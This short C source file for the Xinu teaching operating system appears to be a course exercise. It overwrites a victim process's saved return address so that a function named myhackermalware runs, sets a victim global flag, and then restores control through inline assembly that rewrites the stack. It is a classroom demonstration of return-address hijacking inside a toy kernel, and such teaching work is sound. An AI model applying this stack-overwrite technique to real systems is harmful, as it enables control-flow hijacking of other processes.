#include<xinu.h>
#include<stdio.h>

extern int victimglobal;
extern unsigned long* plzhackme;

unsigned long plzhackme_content;

void myhackermalware(int x) {
    victimglobal = 1;
    unsigned long *my_bp, *my_ret;
    kprintf("victimglobal is %d\n",victimglobal);
    asm ("movl %%ebp, %0"
          :"=r"(my_bp)); 
    my_ret = my_bp+1;
    *my_ret = plzhackme_content;
    return;
}

void myhacker(int victim_pid) {
    plzhackme_content = *plzhackme;
	*plzhackme = (unsigned long) &myhackermalware;
    return;
}
